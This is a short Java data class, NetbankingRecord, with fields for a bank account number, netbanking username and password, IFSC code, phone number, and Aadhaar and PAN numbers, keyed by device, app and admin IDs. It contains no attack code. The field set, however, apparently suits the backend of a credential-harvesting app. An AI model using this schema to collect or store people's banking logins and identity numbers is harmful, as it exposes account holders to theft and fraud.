package app.service.model;

import lombok.*;

@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class NetbankingRecord {
    private Long id;
    private String adminId;
    private String appId;
    private String deviceId;

    private String bankName;
    private String accountNumber;
    private String username;
    private String password;
    private String ifscCode;
    private String phoneNumber;
    private String adharCard;
    private String panCard;

    private Long eventTimestampMs;
}
